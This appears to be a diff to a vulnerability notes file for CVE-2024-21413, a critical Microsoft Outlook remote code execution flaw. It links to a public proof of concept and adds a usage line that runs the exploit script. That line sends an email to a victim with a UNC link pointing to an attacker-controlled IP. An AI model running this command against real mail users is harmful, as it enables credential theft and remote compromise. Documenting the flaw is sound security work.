@@ -4,6 +4,10 @@
 
 ### PoC: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
 
+#### PoC usage:
+
+ - python3 CVE-2024-21413.py --server MAIL_SERVER --port PORT --username USER@DOMAIN.LOCAL --password PASSWORD --sender USER@DOMAIN.LOCAL --recipient VICTIM@DOMAIN.LOCAL --url "\\IP/something" --subject XD
+
 ### Severity: Critical
 
 ### Scoring: 9.8
